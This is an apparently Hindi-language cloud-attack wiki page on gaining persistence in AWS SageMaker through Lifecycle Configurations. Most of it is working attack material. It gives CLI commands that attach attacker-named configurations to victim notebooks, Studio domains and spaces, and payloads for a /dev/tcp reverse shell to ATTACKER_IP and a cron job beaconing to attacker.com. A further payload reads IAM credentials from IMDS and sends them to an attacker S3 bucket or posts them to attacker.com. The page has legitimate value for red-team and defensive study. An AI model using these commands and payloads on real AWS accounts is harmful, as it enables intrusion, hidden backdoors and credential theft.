# AWS - SageMaker Lifecycle Configuration Persistence

## Overview of Persistence Techniques

इस अनुभाग में SageMaker में Lifecycle Configurations (LCCs) का दुरुपयोग करके स्थायीता प्राप्त करने के तरीकों का वर्णन किया गया है, जिसमें रिवर्स शेल, क्रॉन जॉब, IMDS के माध्यम से क्रेडेंशियल चोरी, और SSH बैकडोर शामिल हैं। ये स्क्रिप्ट इंस्टेंस की IAM भूमिका के साथ चलती हैं और पुनरारंभ के दौरान स्थायी रह सकती हैं। अधिकांश तकनीकों के लिए आउटबाउंड नेटवर्क एक्सेस की आवश्यकता होती है, लेकिन AWS नियंत्रण Plane पर सेवाओं का उपयोग करने से भी सफलता मिल सकती है यदि वातावरण 'VPC-only' मोड में है।
#### Note: SageMaker नोटबुक इंस्टेंस मूल रूप से मशीन लर्निंग कार्यभार के लिए विशेष रूप से कॉन्फ़िगर की गई प्रबंधित EC2 इंस्टेंस हैं।

## Required Permissions
* Notebook Instances:
```
sagemaker:CreateNotebookInstanceLifecycleConfig
sagemaker:UpdateNotebookInstanceLifecycleConfig
sagemaker:CreateNotebookInstance
sagemaker:UpdateNotebookInstance
```
* स्टूडियो एप्लिकेशन:
```
sagemaker:CreateStudioLifecycleConfig
sagemaker:UpdateStudioLifecycleConfig
sagemaker:UpdateUserProfile
sagemaker:UpdateSpace
sagemaker:UpdateDomain
```
## नोटबुक उदाहरणों पर जीवनचक्र कॉन्फ़िगरेशन सेट करें

### उदाहरण AWS CLI कमांड:
```bash
# Create Lifecycle Configuration*

aws sagemaker create-notebook-instance-lifecycle-config \
--notebook-instance-lifecycle-config-name attacker-lcc \
--on-start Content=$(base64 -w0 reverse_shell.sh)


# Attach Lifecycle Configuration to Notebook Instance*

aws sagemaker update-notebook-instance \
--notebook-instance-name victim-instance \
--lifecycle-config-name attacker-lcc
```
## Set Lifecycle Configuration on SageMaker Studio

Lifecycle Configurations को विभिन्न स्तरों पर और SageMaker Studio के विभिन्न ऐप प्रकारों पर जोड़ा जा सकता है।

### Studio Domain Level (All Users)
```bash
# Create Studio Lifecycle Configuration*

aws sagemaker create-studio-lifecycle-config \
--studio-lifecycle-config-name attacker-studio-lcc \
--studio-lifecycle-config-app-type JupyterServer \
--studio-lifecycle-config-content $(base64 -w0 reverse_shell.sh)


# Apply LCC to entire Studio Domain*

aws sagemaker update-domain --domain-id <DOMAIN_ID> --default-user-settings '{
"JupyterServerAppSettings": {
"DefaultResourceSpec": {"LifecycleConfigArn": "<LCC_ARN>"}
}
}'
```
### स्टूडियो स्पेस स्तर (व्यक्तिगत या साझा स्पेस)
```bash
# Update SageMaker Studio Space to attach LCC*

aws sagemaker update-space --domain-id <DOMAIN_ID> --space-name <SPACE_NAME> --space-settings '{
"JupyterServerAppSettings": {
"DefaultResourceSpec": {"LifecycleConfigArn": "<LCC_ARN>"}
}
}'
```
## Studio एप्लिकेशन लाइफसाइकिल कॉन्फ़िगरेशन के प्रकार

लाइफसाइकिल कॉन्फ़िगरेशन को विभिन्न SageMaker Studio एप्लिकेशन प्रकारों पर विशेष रूप से लागू किया जा सकता है:
* JupyterServer: Jupyter सर्वर स्टार्टअप के दौरान स्क्रिप्ट चलाता है, जो रिवर्स शेल और क्रॉन जॉब्स जैसे पर्सिस्टेंस मैकेनिज्म के लिए आदर्श है।
* KernelGateway: कर्नेल गेटवे ऐप लॉन्च के दौरान निष्पादित होता है, प्रारंभिक सेटअप या स्थायी पहुंच के लिए उपयोगी है।
* CodeEditor: कोड संपादक (Code-OSS) पर लागू होता है, जो कोड संपादन सत्रों की शुरुआत पर निष्पादित होने वाली स्क्रिप्टों को सक्षम करता है।

### प्रत्येक प्रकार के लिए उदाहरण कमांड:

### JupyterServer
```bash
aws sagemaker create-studio-lifecycle-config \
--studio-lifecycle-config-name attacker-jupyter-lcc \
--studio-lifecycle-config-app-type JupyterServer \
--studio-lifecycle-config-content $(base64 -w0 reverse_shell.sh)
```
### KernelGateway
```bash
aws sagemaker create-studio-lifecycle-config \
--studio-lifecycle-config-name attacker-kernelgateway-lcc \
--studio-lifecycle-config-app-type KernelGateway \
--studio-lifecycle-config-content $(base64 -w0 kernel_persist.sh)
```
### CodeEditor
```bash
aws sagemaker create-studio-lifecycle-config \
--studio-lifecycle-config-name attacker-codeeditor-lcc \
--studio-lifecycle-config-app-type CodeEditor \
--studio-lifecycle-config-content $(base64 -w0 editor_persist.sh)
```
### Critical Info:
* डोमेन या स्पेस स्तर पर LCCs को संलग्न करना सभी उपयोगकर्ताओं या अनुप्रयोगों को प्रभावित करता है जो दायरे में हैं।
* उच्च अनुमतियों की आवश्यकता होती है (sagemaker:UpdateDomain, sagemaker:UpdateSpace) जो आमतौर पर स्पेस स्तर पर डोमेन स्तर की तुलना में अधिक व्यावहारिक होती हैं।
* नेटवर्क-स्तरीय नियंत्रण (जैसे, सख्त निकासी फ़िल्टरिंग) सफल रिवर्स शेल या डेटा निकासी को रोक सकते हैं।

## Reverse Shell via Lifecycle Configuration

SageMaker Lifecycle Configurations (LCCs) कस्टम स्क्रिप्ट को निष्पादित करते हैं जब नोटबुक उदाहरण शुरू होते हैं। अनुमतियों के साथ एक हमलावर एक स्थायी रिवर्स शेल स्थापित कर सकता है।

### Payload Example:
```
#!/bin/bash
ATTACKER_IP="<ATTACKER_IP>"
ATTACKER_PORT="<ATTACKER_PORT>"
nohup bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1 &
```
## Cron Job Persistence via Lifecycle Configuration

एक हमलावर LCC स्क्रिप्ट के माध्यम से क्रोन जॉब्स इंजेक्ट कर सकता है, जिससे दुर्भावनापूर्ण स्क्रिप्ट या कमांड का आवधिक निष्पादन सुनिश्चित होता है, जिससे छिपी हुई स्थिरता सक्षम होती है।

### Payload Example:
```
#!/bin/bash
PAYLOAD_PATH="/home/ec2-user/SageMaker/.local_tasks/persist.py"
CRON_CMD="/usr/bin/python3 $PAYLOAD_PATH"
CRON_JOB="*/30 * * * * $CRON_CMD"

mkdir -p /home/ec2-user/SageMaker/.local_tasks
echo 'import os; os.system("curl -X POST http://attacker.com/beacon")' > $PAYLOAD_PATH
chmod +x $PAYLOAD_PATH

(crontab -u ec2-user -l 2>/dev/null | grep -Fq "$CRON_CMD") || (crontab -u ec2-user -l 2>/dev/null; echo "$CRON_JOB") | crontab -u ec2-user -
```
## IMDS (v1 & v2) के माध्यम से क्रेडेंशियल एक्सफिल्ट्रेशन

लाइफसाइकिल कॉन्फ़िगरेशन IAM क्रेडेंशियल प्राप्त करने और उन्हें हमलावर-नियंत्रित स्थान पर एक्सफिल्ट्रेट करने के लिए इंस्टेंस मेटाडेटा सेवा (IMDS) को क्वेरी कर सकते हैं।

### पेलोड उदाहरण:
```bash
#!/bin/bash
ATTACKER_BUCKET="s3://attacker-controlled-bucket"
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
ROLE_NAME=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME > /tmp/creds.json

# Exfiltrate via S3*

aws s3 cp /tmp/creds.json $ATTACKER_BUCKET/$(hostname)-creds.json

# Alternatively, exfiltrate via HTTP POST*

curl -X POST -F "file=@/tmp/creds.json" http://attacker.com/upload
```

